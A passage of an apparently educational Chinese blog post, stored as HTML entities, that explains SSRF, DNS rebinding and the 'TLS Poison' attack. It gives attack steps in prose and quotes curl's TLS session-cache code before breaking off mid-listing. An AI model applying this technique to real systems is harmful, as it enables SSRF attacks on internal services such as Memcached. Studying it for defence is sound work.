&#x5F62;&#x6210;&#x7684;&#x539F;&#x56E0;&#x5927;&#x90FD;&#x662F;&#x7531;&#x4E8E;&#x670D;&#x52A1;&#x7AEF;&#x63D0;&#x4F9B;&#x4E86;&#x4ECE;&#x5176;&#x4ED6;&#x670D;&#x52A1;&#x5668;&#x5E94;&#x7528;&#x83B7;&#x53D6;&#x6570;&#x636E;&#x7684;&#x529F;&#x80FD;&#x4E14;&#x6CA1;&#x6709;&#x5BF9;&#x76EE;&#x6807;&#x5730;&#x5740;&#x505A;&#x8FC7;&#x6EE4;&#x4E0E;&#x9650;&#x5236;&#x3002;&#x6BD4;&#x5982;&#x4ECE;&#x6307;&#x5B9A;URL&#x5730;&#x5740;&#x83B7;&#x53D6;&#x7F51;&#x9875;&#x6587;&#x672C;&#x5185;&#x5BB9;&#xFF0C;&#x52A0;&#x8F7D;&#x6307;&#x5B9A;&#x5730;&#x5740;&#x7684;&#x56FE;&#x7247;&#xFF0C;&#x4E0B;&#x8F7D;&#x7B49;&#x7B49;&#x3002;</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://dpsvdv74uwwos.cloudfront.net/statics/img/blogposts/exploiting_ssrf_vulnerability.png" alt></p><h3 id="DNS-Rebinding"><a href="#DNS-Rebinding" class="headerlink" title="DNS Rebinding"></a>DNS Rebinding</h3><p>DNS&#x91CD;&#x65B0;&#x7ED1;&#x5B9A;&#x662F;&#x8BA1;&#x7B97;&#x673A;&#x653B;&#x51FB;&#x7684;&#x4E00;&#x79CD;&#x5F62;&#x5F0F;&#x3002; &#x5728;&#x8FD9;&#x79CD;&#x653B;&#x51FB;&#x4E2D;&#xFF0C;&#x6076;&#x610F;&#x7F51;&#x9875;&#x4F1A;&#x5BFC;&#x81F4;&#x8BBF;&#x95EE;&#x8005;&#x8FD0;&#x884C;&#x5BA2;&#x6237;&#x7AEF;&#x811A;&#x672C;&#xFF0C;&#x653B;&#x51FB;&#x7F51;&#x7EDC;&#x4E0A;&#x5176;&#x4ED6;&#x5730;&#x65B9;&#x7684;&#x8BA1;&#x7B97;&#x673A;&#x3002;&#x653B;&#x51FB;&#x8005;&#x6CE8;&#x518C;&#x4E00;&#x4E2A;&#x57DF;&#x540D;&#xFF08;&#x5982;attacker.com&#xFF09;&#xFF0C;&#x5E76;&#x5728;&#x653B;&#x51FB;&#x8005;&#x63A7;&#x5236;&#x4E0B;&#x5C06;&#x5176;&#x4EE3;&#x7406;&#x7ED9;DNS&#x670D;&#x52A1;&#x5668;&#x3002; &#x670D;&#x52A1;&#x5668;&#x914D;&#x7F6E;&#x4E3A;&#x5F88;&#x77ED;&#x54CD;&#x5E94;&#x65F6;&#x95F4;&#x7684;TTL&#x8BB0;&#x5F55;&#xFF0C;&#x9632;&#x6B62;&#x54CD;&#x5E94;&#x88AB;&#x7F13;&#x5B58;&#x3002; &#x5F53;&#x53D7;&#x5BB3;&#x8005;&#x6D4F;&#x89C8;&#x5230;&#x6076;&#x610F;&#x57DF;&#x65F6;&#xFF0C;&#x653B;&#x51FB;&#x8005;&#x7684;DNS &#x670D;&#x52A1;&#x5668;&#x9996;&#x5148;&#x7528;&#x6258;&#x7BA1;&#x6076;&#x610F;&#x5BA2;&#x6237;&#x7AEF;&#x4EE3;&#x7801;&#x7684;&#x670D;&#x52A1;&#x5668;&#x7684; IP &#x5730;&#x5740;&#x4F5C;&#x51FA;&#x54CD;&#x5E94;&#x3002; &#x4F8B;&#x5982;&#xFF0C;&#x4ED6;&#x4EEC;&#x53EF;&#x4EE5;&#x5C06;&#x53D7;&#x5BB3;&#x8005;&#x7684;&#x6D4F;&#x89C8;&#x5668;&#x6307;&#x5411;&#x5305;&#x542B;&#x65E8;&#x5728;&#x5728;&#x53D7;&#x5BB3;&#x8005;&#x8BA1;&#x7B97;&#x673A;&#x4E0A;&#x6267;&#x884C;&#x7684;&#x6076;&#x610F; JavaScript &#x6216; Flash &#x811A;&#x672C;&#x7684;&#x7F51;&#x7AD9;&#x3002;</p><p>&#x6076;&#x610F;&#x5BA2;&#x6237;&#x7AEF;&#x4EE3;&#x7801;&#x4F1A;&#x5BF9;&#x539F;&#x59CB;&#x57DF;&#x540D;&#xFF08;&#x4F8B;&#x5982;attacker.com&#xFF09;&#x8FDB;&#x884C;&#x989D;&#x5916;&#x8BBF;&#x95EE;&#xFF0C;&#x8FD9;&#x4E9B;&#x90FD;&#x662F;&#x7531;&#x540C;&#x6E90;&#x653F;&#x7B56;&#x6240;&#x5141;&#x8BB8;&#x7684;&#x3002; &#x4F46;&#x662F;&#xFF0C;&#x5F53;&#x53D7;&#x5BB3;&#x8005;&#x7684;&#x6D4F;&#x89C8;&#x5668;&#x8FD0;&#x884C;&#x8BE5;&#x811A;&#x672C;&#x65F6;&#xFF0C;&#x5B83;&#x4F1A;&#x4E3A;&#x8BE5;&#x57DF;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x65B0;&#x7684; DNS &#x8BF7;&#x6C42;&#xFF0C;&#x5E76;&#x4E14;&#x653B;&#x51FB;&#x8005;&#x4F1A;&#x4F7F;&#x7528;&#x65B0;&#x7684; IP &#x5730;&#x5740;&#x8FDB;&#x884C;&#x56DE;&#x590D;&#x3002; &#x4F8B;&#x5982;&#xFF0C;&#x4ED6;&#x4EEC;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x5185;&#x90E8; IP &#x5730;&#x5740;&#x6216;&#x4E92;&#x8054;&#x7F51;&#x4E0A;&#x67D0;&#x4E2A;&#x76EE;&#x6807;&#x7684;IP&#x5730;&#x5740;&#x8FDB;&#x884C;&#x56DE;&#x590D;&#x3002;</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://torbencapiau.be/wp-content/uploads/2019/12/chrome_O70990jBNt-1024x574.png" alt></p><h2 id="TLS-Poison"><a href="#TLS-Poison" class="headerlink" title="TLS Poison"></a>TLS Poison</h2><p>&#x597D;&#x4E86;&#xFF0C;&#x7EC8;&#x4E8E;&#x4ECB;&#x7ECD;&#x5B8C;&#x80CC;&#x666F;&#x77E5;&#x8BC6;&#x4E86;&#xFF0C;&#x73B0;&#x5728;&#x8BA9;&#x6211;&#x4EEC;&#x6765;&#x770B;&#x770B;&#x672C;&#x6B21;&#x8981;&#x4ECB;&#x7ECD;&#x7684; TLS Poison &#x653B;&#x51FB;&#x3002;</p><p>&#x8FD9;&#x91CC;&#x4E00;&#x53E5;&#x8BDD;&#x5E2E;&#x5927;&#x5BB6;&#x603B;&#x7ED3;&#x6982;&#x62EC;&#x4E00;&#x4E0B;&#xFF1A;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5229;&#x7528; TLS Session Resumption &#x7684;&#x7279;&#x6027;&#x7ED3;&#x5408; DNS Rebinding &#x6280;&#x5DE7;&#x64CD;&#x4F5C;&#x4E00;&#x4E9B;&#x5BA2;&#x6237;&#x7AEF;&#x5E2E;&#x52A9;&#x6211;&#x4EEC;&#x8FDB;&#x884C; SSRF &#x653B;&#x51FB;&#x3002;</p><p>&#x5176;&#x5B9E;&#x6574;&#x4E2A;&#x653B;&#x51FB;&#x5C31;&#x50CF;&#x4E0A;&#x8FF0;&#x8BF4;&#x7684;&#x4E00;&#x6837;&#xFF0C;&#x975E;&#x5E38;&#x901A;&#x4FD7;&#x6613;&#x61C2;&#xFF0C;&#x65E0;&#x975E;&#x5C31;&#x662F; TLS Session Resumption &#x3001; DNS Rebinding &#x3001;&#x4E00;&#x4E2A;&#x50BB;&#x767D;&#x751C;&#x53D7;&#x5BB3;&#x8005;&#xFF0C;&#x7ED3;&#x5408;&#x5728;&#x4E00;&#x8D77;&#x5C31;&#x4FBF;&#x6709;&#x4E86;&#x6211;&#x4EEC;&#x7684; TLS Poison &#x3002;</p><p><strong>PS: &#x5982;&#x65E0;&#x7279;&#x6B8A;&#x8BF4;&#x660E;&#xFF0C;&#x6574;&#x4E2A;&#x5B9E;&#x9A8C;&#x80CC;&#x666F;&#x5747;&#x57FA;&#x4E8E; Ubuntu 20.04 LTS &#xFF0C;curl 7.68.0 build with OpenSSL/1.1.1f  &#xFF0C;&#x540E;&#x6587;&#x63D0;&#x5230;&#x7684; IPv6 &#x5747;&#x6307;&#x7684;&#x662F;  IPv4-mapped IPv6 addresses &#x8FD9;&#x7C7B;&#x5730;&#x5740;</strong></p><h3 id="Attack-Steps"><a href="#Attack-Steps" class="headerlink" title="Attack Steps"></a>Attack Steps</h3><p>&#x8BA9;&#x6211;&#x4EEC;&#x8FDB;&#x4E00;&#x6B65;&#x6765;&#x770B;&#x770B;&#x8FD9;&#x4E2A;&#x653B;&#x51FB;&#x601D;&#x8DEF;&#xFF1A;</p><ol><li>&#x9996;&#x5148;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4ECE;&#x80CC;&#x666F;&#x77E5;&#x8BC6;&#x5F53;&#x4E2D;&#x77E5;&#x9053; TLS Session Resumption &#x7279;&#x6027;&#xFF0C;&#x65E0;&#x8BBA;&#x662F; TLS 1.2 &#x6216;&#x8005; 1.3 &#xFF0C;&#x5B83;&#x4EEC;&#x90FD;&#x4F1A;&#x4F7F;&#x7528;&#x4E86;&#x4E00;&#x4E2A;&#x51ED;&#x636E;&#x4E00;&#x6837;&#x7684;&#x4E1C;&#x897F;&#x6765;&#x8868;&#x660E;&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x8EAB;&#x4EFD;&#xFF0C;&#x5C31;&#x50CF;&#x5728; Web &#x6D4F;&#x89C8;&#x4E2D;&#x7684; Cookie &#x4E00;&#x6837;&#xFF0C;&#x8FD9;&#x4E2A;&#x51ED;&#x636E;&#x53C8;&#x662F;&#x7531;&#x670D;&#x52A1;&#x7AEF;&#x4E0B;&#x53D1;&#x7ED9;&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#xFF0C;&#x6240;&#x4EE5;&#x5982;&#x679C;&#x6211;&#x4EEC;&#x6709;&#x4E00;&#x4E2A;&#x6076;&#x610F;&#x7684; Server &#xFF0C;&#x8BA9;&#x4E00;&#x4E2A;&#x5BA2;&#x6237;&#x7AEF;&#x4F7F;&#x7528; HTTPS &#x8BBF;&#x95EE;&#x6211;&#x4EEC;&#x7684;&#x670D;&#x52A1;&#x5668;&#x65F6;&#xFF0C;&#x5728; TLS &#x63E1;&#x624B;&#x65F6;&#x8FD9;&#x4E2A;&#x51ED;&#x636E;&#x5C31;&#x662F;&#x6211;&#x4EEC;&#x6076;&#x610F;&#x670D;&#x52A1;&#x5668;&#x5206;&#x914D;&#x7ED9;&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#xFF0C;&#x800C;&#x5BA2;&#x6237;&#x7AEF;&#x4F1A;&#x628A;&#x8FD9;&#x4E2A;&#x51ED;&#x636E;&#x6309;&#x7167;<strong>&#x4E00;&#x5B9A;&#x89C4;&#x5219;</strong>&#x5B58;&#x50A8;&#x8D77;&#x6765;&#xFF0C;&#x4EE5;&#x4FBF;&#x4EE5;&#x540E;&#x9700;&#x8981;&#x8DDF;&#x6211;&#x4EEC;&#x6076;&#x610F;&#x670D;&#x52A1;&#x5668;&#x6062;&#x590D;&#x4E0A;&#x4E00;&#x6B21;&#x4F1A;&#x8BDD;&#x65F6;&#x4F7F;&#x7528;&#x3002;&#x6240;&#x4EE5;&#xFF0C;&#x4ECE;&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x77E5;&#x9053;&#xFF0C;&#x5982;&#x679C;&#x53EF;&#x4EE5;&#x8BA9;&#x5BA2;&#x6237;&#x7AEF;&#x4EE5; HTTPS &#x5F62;&#x5F0F;&#x8BBF;&#x95EE;&#x4EFB;&#x610F;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x5728;&#x8FDB;&#x884C; TLS &#x63E1;&#x624B;&#x65F6;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x8BA9;&#x5BA2;&#x6237;&#x7AEF;&#x5B58;&#x50A8;&#x6211;&#x4EEC;&#x6307;&#x5B9A;&#x7684;&#x4F1A;&#x8BDD;&#x51ED;&#x636E;&#x3002;</li><li>&#x63A5;&#x7740;&#xFF0C;&#x5728;&#x8FDB;&#x884C; HTTPS &#x8BF7;&#x6C42;&#x524D;&#xFF0C;&#x5BA2;&#x6237;&#x7AEF;&#x5FC5;&#x5B9A;&#x9700;&#x8981;&#x5BF9;&#x6211;&#x4EEC;&#x7ED9;&#x7684;&#x57DF;&#x540D;&#x8FDB;&#x884C;&#x4E00;&#x6B21; DNS &#x67E5;&#x8BE2;&#xFF0C;&#x800C;&#x5728;&#x5BA2;&#x6237;&#x7AEF;&#x60F3;&#x8981;&#x6062;&#x590D;&#x4F1A;&#x8BDD;&#x7684;&#x65F6;&#x5019;&#xFF0C;<strong>&#x5982;&#x679C;&#x5BA2;&#x6237;&#x7AEF;&#x7684; DNS &#x7F13;&#x5B58;&#x8FC7;&#x671F;</strong>&#xFF0C;&#x5219;&#x53C8;&#x4F1A;&#x8FDB;&#x884C;&#x4E00;&#x6B21; DNS &#x67E5;&#x8BE2;&#xFF1B;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x8FC7;&#x671F;&#xFF0C;&#x5219;&#x5229;&#x7528;&#x4E4B;&#x524D;&#x7684; DNS &#x67E5;&#x8BE2;&#x7ED3;&#x679C;&#x5F97;&#x5230;&#x7684; IP &#x8FDB;&#x884C;&#x6062;&#x590D;&#x4F1A;&#x8BDD;&#x3002;&#x6240;&#x4EE5;&#x5F53;&#x6761;&#x4EF6;&#x6EE1;&#x8DB3;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x6B63;&#x597D;&#x5728;&#x5BA2;&#x6237;&#x7AEF;&#x60F3;&#x8981;&#x6062;&#x590D; TLS &#x4F1A;&#x8BDD;&#xFF0C;&#x800C; DNS &#x7F13;&#x5B58;&#x53C8;&#x8FC7;&#x671F;&#x4E86;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5C31;&#x4F1A;&#x53D1;&#x8D77;&#x4E00;&#x6B21; DNS &#x67E5;&#x8BE2;&#xFF0C;&#x8FD9;&#x91CC;&#x6B63;&#x597D;&#x5C31;&#x6EE1;&#x8DB3;&#x4E86; DNS Rebinding &#x7684;&#x6761;&#x4EF6;&#x3002;</li><li>&#x8FD9;&#x6837;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x4E3A;&#x81EA;&#x5DF1;&#x7684;&#x57DF;&#x540D;&#x642D;&#x5EFA;&#x4E00;&#x4E2A; DNS &#x670D;&#x52A1;&#x5668;&#xFF0C;&#x5728;&#x5BA2;&#x6237;&#x7AEF;&#x7B2C;&#x4E00;&#x6B21;&#x53D1;&#x8D77; DNS &#x8BF7;&#x6C42;&#x65F6;&#xFF0C;&#x6211;&#x4EEC;&#x8BA9; DNS &#x670D;&#x52A1;&#x5668;&#x8FD4;&#x56DE;&#x6B63;&#x786E;&#x7684;&#x3001;&#x6307;&#x5411;&#x6211;&#x4EEC;&#x6076;&#x610F;&#x670D;&#x52A1;&#x5668;&#x7684; IP &#xFF0C;&#x8BA9;&#x7B2C;&#x4E00;&#x6B21; TLS &#x63E1;&#x624B;&#x6210;&#x529F;&#xFF0C;&#x4E5F;&#x8BA9;&#x5BA2;&#x6237;&#x7AEF;&#x7F13;&#x5B58;&#x6211;&#x4EEC;&#x5236;&#x5B9A;&#x7684;&#x4F1A;&#x8BDD;&#x51ED;&#x636E;&#xFF1B;&#x5728;&#x5BA2;&#x6237;&#x7AEF;&#x6062;&#x590D;&#x4F1A;&#x8BDD;&#x65F6;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x5BA2;&#x6237;&#x7AEF;&#x53D1;&#x8D77;&#x7B2C;&#x4E8C;&#x6B21; DNS &#x8BF7;&#x6C42;&#x65F6;&#xFF0C;&#x6211;&#x4EEC;&#x8BA9; DNS &#x670D;&#x52A1;&#x5668;&#x8FD4;&#x56DE;&#x6211;&#x4EEC;&#x60F3;&#x8981;&#x653B;&#x51FB;&#x7684;&#x5185;&#x7F51;&#x5730;&#x5740;&#xFF0C;&#x4F8B;&#x5982; 127.0.0.1 &#xFF0C;&#x8FD9;&#x6837;&#x5728;&#x5BA2;&#x6237;&#x7AEF;&#x5C1D;&#x8BD5;&#x6062;&#x590D;&#x4F1A;&#x8BDD;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5BA2;&#x6237;&#x7AEF;&#x4F1A;&#x62FF;&#x7740;&#x6211;&#x4EEC;&#x7ED9;&#x5B83;&#x7684;&#x7279;&#x5236;&#x7968;&#x636E;&#x53BB;&#x4E0E;&#x8FD9;&#x4E2A;&#x5730;&#x5740;&#x5C1D;&#x8BD5;&#x8FDB;&#x884C; TLS &#x63E1;&#x624B;&#x3002;</li><li>&#x8FD9;&#x610F;&#x5473;&#x7740;&#x4EC0;&#x4E48;&#x5462;&#xFF1F;&#x7279;&#x5236;&#x7684;&#x7968;&#x636E;&#x3001;&#x6307;&#x5B9A;&#x7684;&#x5185;&#x7F51;&#x5730;&#x5740;&#xFF0C;&#x5C31;&#x6784;&#x6210;&#x4E86;&#x4E00;&#x6B21;&#x5BF9;&#x5185;&#x7F51;&#x670D;&#x52A1;&#x7684;&#x8BF7;&#x6C42;&#xFF01;</li></ol><p>&#x4F46;&#x662F;&#x4F3C;&#x4E4E;&#x6211;&#x4EEC;&#x53C8;&#x5FFD;&#x7565;&#x4E86;&#x4EC0;&#x4E48;&#xFF1F;&#x5982;&#x679C;&#x6211;&#x60F3;&#x653B;&#x51FB;&#x5185;&#x7F51;&#x7684; Memcached &#xFF0C;&#x7AEF;&#x53E3;&#x5728; 11211 &#x4E0D;&#x5728; 443 &#x600E;&#x4E48;&#x529E;&#xFF1F;&#x6B63;&#x5982;&#x6211;&#x4EEC;&#x4E0A;&#x9762;&#x6240;&#x5F3A;&#x8C03;&#x7684;&#x201C;&#x5BA2;&#x6237;&#x7AEF;&#x4F1A;&#x628A;&#x8FD9;&#x4E2A;&#x51ED;&#x636E;&#x6309;&#x7167;<strong>&#x4E00;&#x5B9A;&#x89C4;&#x5219;</strong>&#x5B58;&#x50A8;&#x8D77;&#x6765;&#x201D;&#xFF0C;&#x90A3;&#x4E48;&#x8FD9;&#x4E2A;<strong>&#x4E00;&#x5B9A;&#x89C4;&#x5219;</strong>&#x53C8;&#x662F;&#x4EC0;&#x4E48;&#x5462;&#xFF1F;</p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x968F;&#x4FBF;&#x627E;&#x4E2A;&#x4F8B;&#x5B50;&#x6765;&#x770B;&#xFF0C;&#x6BD4;&#x5982; curl 7.75.0 &#xFF0C;&#x5728; curl &#x6E90;&#x7801;&#x7684; lib/vtls/vtls.c#408 &#x6587;&#x4EF6;&#x5F53;&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x627E;&#x5230;&#x8FD9;&#x6837;&#x7684;&#x4EE3;&#x7801;&#xFF1A;</p><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; data-&gt;<span class="hljs-built_in">set</span>.general_ssl.max_ssl_sessions; i++) {</span><br><span class="line">  check = &amp;data-&gt;state.session[i];</span><br><span class="line">  <span class="hljs-keyword">if</span>(!check-&gt;sessionid)</span><br><span class="line">    <span class="hljs-comment">/* not session ID means blank entry */</span></span><br><span class="line">    <span class="hljs-keyword">continue</span>;</span><br><span class="line">  <span class="hljs-keyword">if</span>(strcasecompare(name, check-&gt;name) &amp;&amp;</span><br><span class="line">     ((!conn-&gt;bits.conn_to_host &amp;&amp; !check-&gt;conn_to_host) ||</span><br><span class="line">      (conn-&gt;bits.conn_to_host &amp;&amp; check-&gt;conn_to_host &amp;&amp;</span><br><span class="line">       strcasecompare(conn-&gt;conn_to_host.name, check-&gt;conn_to_host))) &amp;&amp;</span><br><span class="line">     ((!conn-&gt;bits.conn_to_port &amp;&amp; check-&gt;conn_to_port == <span class="hljs-number">-1</span>) ||</span><br><span class="line">      (conn-&gt;bits.conn_to_port &amp;&amp; check-&gt;conn_to_port != <span class="hljs-number">-1</span> &amp;&amp;</span><br><span class="line">       conn-&gt;conn_to_port == check-&gt;conn_to_port)) &amp;&amp;</span><br><span class="line">     (port == check-&gt;remote_port) &amp;&amp;</span><br><span class="line">     strcasecompare(conn-&gt;handler-&gt;scheme, check-&gt;scheme) &amp;&amp;</span><br><span class="line">     Curl_ssl_config_matches(ssl_config, &amp;check-&gt;ssl_config)) {</span><br><span class="line">    <span class="hljs-comment">/* yes, we have a session ID! */</span></span><br><span class="line">    (*general_age)++;          <span class="hljs-comment">/* increase general age */</span></span><br><span class="line">    check-&gt;age = *general_age; <span class="hljs-comment">/* set this as used in this age */</span></span><br><span class="line">    *ssl_sessionid = check-&gt;sessionid;</span><br><span class="line">    <span class="hljs-keyword">if</span>(idsize)</span><br><span class="line">      *idsize = check-&gt;idsize;</span><br><span class="line">    no_match = FALSE;</span><br><span class="line">    <span class="hljs-keyword">break</span>;</span><br><span class="line">  }</span><br><span 